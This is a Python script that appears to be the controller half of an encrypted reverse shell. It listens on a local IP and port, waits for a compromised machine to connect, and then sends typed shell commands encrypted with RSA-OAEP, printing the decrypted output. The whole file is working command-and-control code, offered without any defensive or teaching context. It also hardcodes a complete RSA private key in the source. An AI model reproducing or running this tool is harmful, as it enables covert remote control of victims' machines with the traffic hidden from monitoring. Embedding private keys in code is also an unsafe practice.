from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import socket

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4wVDLHSF10k8bOspYUB5
HR1DjYCjg6sUgd7O6QWVTzJTunkj8DJakfC7bghsiExO+XFK8N/GDYCBQHicF91k
ioO4CAbwB3AmtVLULoFSABQCH3MQdEnwfF4iIG+arF/IEMXV4iKueB3IvGA7OBYU
8mFyMRHFdAK5NIYQXbH+H3QfbUfnocF00HA/zuyLPtTo05nGsqe/U6dphUDMgnQs
2zvn2wJoyRi7jp+5sjQMt/2UPVHFK+4K4n8h61s1XmPr06A3pDy8JwHvg0Hjmpgu
kgU9K1bOPDNQVlzokePQhZA0Cl/7HAQlA7T0fkYrBdNXEr+sucpw6buHqrTGcLXz
4uH5knOWXKVzt53SzhFx0vzDmOKsTOLRw0kpHBlwuzB+5Dfr6iPAjuyEhoawfRN2
3mdyMs6K2dh8aoAHlUTGmWPHOlVM+M3ooUEguwuHnVWWuBi5dtiyT0opqOzeSd8T
dYKQkvmzcDP/1NnPwHPHwYEyoNtrIVZdEUTzazsiQs1n9yQpbExeT0JlDrIPLSp7
e1l+1oH1hiQraMuY4Mp+Z3zxqzeSqRCL0wjCCQkjU7Po4KEtD14bYBMHu1jgPXE7
vHDwHqaXIofAQlBno+0MCuXU7ClblTUrnGsHj4qswbvJQautgS7ON7CS2drmiEdw
pgC7oOj7w9J6eZKWM3GCMU0CAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encrypteddata = encryptor.encrypt(message)
    return encrypteddata

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIJKAIBAAKCAgEA4wVDLHSF10k8bOspYUB5HR1DjYCjg6sUgd7O6QWVTzJTunkj
8DJakfC7bghsiExO+XFK8N/GDYCBQHicF91kioO4CAbwB3AmtVLULoFSABQCH3MQ
dEnwfF4iIG+arF/IEMXV4iKueB3IvGA7OBYU8mFyMRHFdAK5NIYQXbH+H3QfbUfn
ocF00HA/zuyLPtTo05nGsqe/U6dphUDMgnQs2zvn2wJoyRi7jp+5sjQMt/2UPVHF
K+4K4n8h61s1XmPr06A3pDy8JwHvg0HjmpgukgU9K1bOPDNQVlzokePQhZA0Cl/7
HAQlA7T0fkYrBdNXEr+sucpw6buHqrTGcLXz4uH5knOWXKVzt53SzhFx0vzDmOKs
TOLRw0kpHBlwuzB+5Dfr6iPAjuyEhoawfRN23mdyMs6K2dh8aoAHlUTGmWPHOlVM
+M3ooUEguwuHnVWWuBi5dtiyT0opqOzeSd8TdYKQkvmzcDP/1NnPwHPHwYEyoNtr
IVZdEUTzazsiQs1n9yQpbExeT0JlDrIPLSp7e1l+1oH1hiQraMuY4Mp+Z3zxqzeS
qRCL0wjCCQkjU7Po4KEtD14bYBMHu1jgPXE7vHDwHqaXIofAQlBno+0MCuXU7Clb
lTUrnGsHj4qswbvJQautgS7ON7CS2drmiEdwpgC7oOj7w9J6eZKWM3GCMU0CAwEA
AQKCAf99CWj2EzekW7HsS5l+9wO+BWAvj6p/2rpwzUcpEOortIxpKE+i/BjmSLDy
6bDdYSoeOUgNYzKyPRTzbXqLqmS15dZ2lVuevSaUuAolkxSW9m405Csr4Y2S8kXZ
l56ZUiffFRe4dWGixsTI/DehrIfc987tN9yJCPb49t4MvPw6Vrr4daIedW7hXvHG
BoKrGJkj8o591+aJLKvxuL7rGxGZrmUFO057dCPZah/dBs36iLAdFeyDRZi5J0yH
VLUQR/iblqMO0mTPF0HUCXZSr3727evC8wykG58j8ggmUlOHPOVs0XB8/ctlP0Vq
Rztq+fv7V5bKvbVzBtayLt8dNRod0lvQfCTAThqLFhTGu0FG0T6WCIeDlSpmv5+a
e41hKPWlDVKo2AGsO4Na0zG4vnhG+3plrqLYxhLgzOAX/zI1E28E61Ftjxly5Nfs
hQEAF9C2xyY6vcsDnvq0k5WC73NK8QZ0efAY0/aVAUsE1dZek/icF6RQEGrfnRfU
Y3X3G1eaQRMrZP8pVm3+EF8uyWOMke3/NpDohQVrqMIMPGjtwo0eHJAW9qogNQ+r
tgR2CCqCOpch3QEfx+Q20r/YXDba3Q+yEJHK+eKNtvkDW9FefX/MZzVKcaw2dii1
0jJhtjTK5RL1jdkrqiWF/CTAdRlTg5iZaCWxO+Jxa5RtG7bhAoIBAQDjxMlIuBse
sRtiNcdYhMN1jPEQM+Mpdfu5T4M7NZaIGaEMmvGJmQM4MwvJOY99zFcxU4sNY6BZ
xsaHJBlyl9mxFRmsMeVgAGIGXNr42TEXcqXVo/4fs5ybbRr8mDLUEcstmjZ97tay
V4Wq4pyJBnzy0q0QWKi+9GHxJmE5UpoVfdSNJYnA+RiciyC9NB54jwOnfVXH37nn
3gCqo8Axv19tgvz1OttEUjcBIdErYqY3yFVRgOe3DI6MgRmX2VmuhTetHqD6Of4x
AIJS2l8gB8eqg/hYz9zXyI7qnHoasCVbWcx++sKM5sLbEk+E/SwAjGG78Mlvrli9
Vp7Kvaf7lyd1AoIBAQD/KLy+AiOphSewfmka6WotTYajDh1D7Q6GuhfEh6YWiB0F
P1a1/qoiu4imrjgi73t/MB9LFBuzgZ7BDW9YAs26nCrp2uZDMNtiLYLRc2EsUc/S
w8GLkGPcI3OCz+qGiWvj0VRPeu9D0VLfRD7rBBLH2xKLEbxNdYHheog5kUlGyfth
IfscV36qOY6mH5o1bMQGeE2hdc3lSBGPYphv+NTqP7KAp1MyWFAB1uhkrGTFbaIy
cWZgAFEB9WSKoACcejaNgJbc52Lk83DUpy5pdyPOnn/LFkL7aR9p9MH0sc2QY6YD
Lnh/wdQhLn80BRKPyWzqJztTopJVdFPfaEGWV/95AoIBAGEV/XJYv36aoYCASeOK
W8JcfFiatWZz2wOHR/nSAsMqoYI8/V3Ycg3ffFOejHJjynrFEI15fN0npHHwSkSV
Q35+7v1+GzaLkz0BEXlnIszK2rMw/t5GcieyHwGyYmAQ4ZkjlbyiNLO6KMjJZU3n
DRV4Bbrk/7C9fI4M/P4xHmqwwwwTBx/RTdNUXnUnpSFgXH9lJk5XJ+gUshYKTJ8n
4qZMYkSpfNMndDiwUHd8yjsW0n82Qg69dHmhgeY/CEIimLPbTWS7mYULoYFtgYSm
rE4biJ1apNj5rSmF32pG0PWaVld9zbW/mylEKc8XF014iSRSI5rOJxc1t+PVaagN
Kw0CggEBAKdRMEssnfQIk9khW4zBKNXiM3pyw/AJ3++q0fEWvmuh/920Bgk7oJc8
AETEk50dCw+BH9QcsHmKcu7G/49n7z4CMAW/fCTtQb7kdxcfoMXuM+hSY3VATqtJ
N/K8ol5seKogVzfzNjhzZ/NuDhAQULxrRIKbM65bcrrHndKaGcHoqwWrwb15Bl9b
dNYsfPOxie1wL//Dfyttkc5DahBqzDt7X3MLxfuKe5RpN2TkwwPPe3+2atpi+rvd
DXv1pdD2NxWdD9B1jpzxobhglIemD33q44Pp6ixwZ6AUVqc9fL3FClSlwXCNSqwj
kFgtR1mwTNJSvY1/WpPcvy8Nb4zF0YkCggEBAMsOwGiyTt3mRg8cqhgKpB8MeCbn
PJ9LTEAYdbvX6s6QnrTnDdYzRCqhgqYkJS7ZFeS7r8Joflin4MUlX8/PPCXTBOX1
PcdQUOr0tZiIQIt9OtG10RxBGohXyMd3va6zU8jakcYMpQX3KIXJXsv6gjBAy6hZ
/8o9dMrbu07mHV+zFTL6WTFOkKagc5pkwYh3XOUIYX+achki9lN6ngDJbI1grmI0
Bh7umBRYdsKuNcaV/OdlIXei4Tyzgc7eC73t30+6kzd3sTCB1ePIsS+uEkHnmwRp
JtTILZB6YhvBn1TNpHN+UV25CN+wNODJXbBvk9a38cLZ7odh6FzJxikD/L8=
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    decryptedmessage = decryptor.decrypt(cipher)
    return decryptedmessage.decode()
def connect():
    s = socket.socket()
    s.bind(("192.168.42.227",8080))
    s.listen(1)
    conn,addr = s.accept()
    print("we gotta connection from: ",addr)
    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] error in decryption!!!")
connect()
    
